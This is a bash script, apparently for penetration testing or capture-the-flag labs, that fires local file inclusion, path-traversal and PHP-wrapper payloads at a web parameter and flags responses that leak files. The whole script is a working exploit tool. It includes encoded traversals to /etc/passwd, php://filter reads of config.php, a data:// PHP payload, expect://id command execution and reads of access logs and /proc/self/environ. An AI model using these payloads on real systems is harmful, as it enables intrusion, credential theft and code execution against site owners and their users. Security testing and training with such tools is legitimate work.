#!/usr/bin/env bash
# lfi-probe — fire the common LFI / path-traversal / PHP-wrapper vectors at one param.
#
# Replace the injectable value in the URL with the token INJECT. For each vector it
# prints the HTTP code and first match line so you can spot the one that reads a file.
#
# Usage:
#   ./lfi-probe.sh "http://app/index.php?page=INJECT"
#   ./lfi-probe.sh "http://app/index.php?page=INJECT" -c "session=abc" -f /root/proof.txt
#
# Flags:  -c <cookie>   -f <extra file to try, e.g. /root/proof.txt>
set -euo pipefail

URL="${1:?usage: lfi-probe.sh \"http://app/index.php?page=INJECT\" [-c cookie] [-f file]}"
shift || true
COOKIE="" ; EXTRA=""
while [ $# -gt 0 ]; do case "$1" in -c) COOKIE="$2"; shift 2;; -f) EXTRA="$2"; shift 2;; *) shift;; esac; done

PASSWD="/etc/passwd"
declare -a V=(
  "../../../../../../../../$PASSWD"
  "..%2f..%2f..%2f..%2f..%2f..%2f$PASSWD"
  "....//....//....//....//$PASSWD"
  "..%252f..%252f..%252f..%252f$PASSWD"
  "/$PASSWD"
  "php://filter/convert.base64-encode/resource=index.php"
  "php://filter/convert.base64-encode/resource=config.php"
  "data://text/plain;base64,PD9waHAgZWNobyAnV0FSTS1EQVRBLU9LJzsgPz4="
  "expect://id"
  "/var/log/apache2/access.log"
  "/proc/self/environ"
)
[ -n "$EXTRA" ] && V+=("php://filter/convert.base64-encode/resource=$EXTRA" "../../../../../../../..$EXTRA")

for v in "${V[@]}"; do
  enc=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=":/."))' "$v")
  u="${URL/INJECT/$enc}"
  resp=$(curl -s -w "\n%{http_code}" ${COOKIE:+-H "Cookie: $COOKIE"} "$u")
  code=$(echo "$resp" | tail -1)
  body=$(echo "$resp" | head -n -1)
  hint=$(echo "$body" | grep -m1 -oE 'root:.*:0:0:|WARM-DATA-OK|^[A-Za-z0-9+/]{40,}={0,2}$' || true)
  printf '[%s] %-55s %s\n' "$code" "${v:0:55}" "${hint:+<= $hint}"
done
echo "[*] A base64 blob => php://filter worked: pipe it to  base64 -d.  'root:...:0:0:' => direct file read."
